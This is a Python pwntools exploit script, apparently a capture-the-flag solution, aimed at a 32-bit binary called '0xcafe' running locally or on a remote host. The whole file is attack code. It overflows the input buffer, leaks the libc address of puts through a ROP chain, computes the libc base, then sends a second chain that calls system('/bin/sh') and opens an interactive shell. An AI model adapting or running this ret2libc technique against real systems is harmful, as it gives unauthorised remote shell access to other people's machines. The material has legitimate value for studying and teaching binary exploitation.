#! /usr/bin/python2
# -*- coding: utf-8 -*-

from pwn import *
from sys import argv

context(os = 'linux', arch = 'i386')
context.log_level = 'debug'

elf = ELF('./0xcafe')
libc = ELF('./libc.so.6')
rop1 = ROP(elf)

rop1.puts(elf.got['puts'])
rop1.exit()

prelude = 'A'*100 # This is not fixed
epilogue = 'A'*(256-len(prelude)-len(rop1.chain()))

stage1 = prelude + rop1.chain() + epilogue

log.info('Generated payload:\n{}'.format(rop1.dump()))

if len(argv) != 3:
    r = process('./0xcafe')
else:
    r = remote(argv[1], int(argv[2]))

r.recvuntil('?\n')
r.sendline(stage1)

r.recvuntil('that!\n')

libc_puts = u32(r.recvn(4))

log.info('Found libc_puts @ 0x{:08x}'.format(libc_puts))

log.info('Calculating libc base')
libc_base = libc_puts - libc.symbols['puts']
log.success('Calculated libc base @ 0x{:08x}'.format(libc_base))

rop2 = ROP(elf)

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search('/bin/sh\x00'))

rop2.call(system, [binsh])
rop2.exit()

stage2 = prelude + rop2.chain() + epilogue

log.info('Generated payload:\n{}'.format(rop2.dump()))

if len(argv) != 3:
    r = process('./0xcafe')
else:
    r = remote(argv[1], int(argv[2]))

r.recvuntil('?\n')
r.sendline(stage2)

r.clean()
r.interactive()
